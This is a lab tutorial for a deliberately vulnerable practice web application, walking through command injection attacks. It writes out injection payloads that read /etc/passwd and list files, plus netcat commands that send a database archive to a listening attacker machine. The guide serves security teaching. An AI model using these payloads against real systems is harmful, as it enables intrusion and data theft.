Command Injection Attacks
=========================

Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.

#. Configure DVWA Security (This makes the site vulnerable to allow attacks)
     - In the Left Menus Select DVWA Security
     - Change Impossible to **LOW** and Click Submit

     .. image:: ../images/Attacks/Picture6.png
          :width: 700
#. Performing ‘Command-Injection’ Attack (view /etc/passwd)
     in the data field type the command

     .. code-block::

       8.8.8.8 | cat /etc/passwd
      
     .. image:: ../images/Attacks/Picture7.png
          :width: 700
#. Performing ‘Command-Injection’ Attack (view local directory files)
     in the data field type the command

     .. code-block::

       | ls

     .. image:: ../images/Attacks/Picture8.png
          :width: 700
#. Performing ‘Command-Injection’ Attack (data exfiltration using NetCat)
     in Kali Linux Web Shell run the following commands to setup the receiving end of the Data Exfiltration

     .. code-block::

       cd /home/kali
       ls
       rm -rf Sample-Db.zip
       ls
       nc -l -p 8888 > Sample-DB.zip

     .. image:: ../images/Attacks/Picture9.png
          :width: 800
#. Performing ‘Command-Injection’ Attack (data exfiltration using NetCat)
     in the DVWA command injection area type the command

     .. code-block::

       | nc -w 3 10.1.50.8 8888 < Sample-DB.zip

     .. image:: ../images/Attacks/Picture10.png
          :width: 700
#. Performing ‘Command-Injection’ Attack (data exfiltration using NetCat)
     in the Kali Linux Web Shell the previous command should be completed and a new command line will be available verify size of file exfiltrated using command

     .. code-block::

       ls -AlFh

     .. image:: ../images/Attacks/Picture11.png
          :width: 500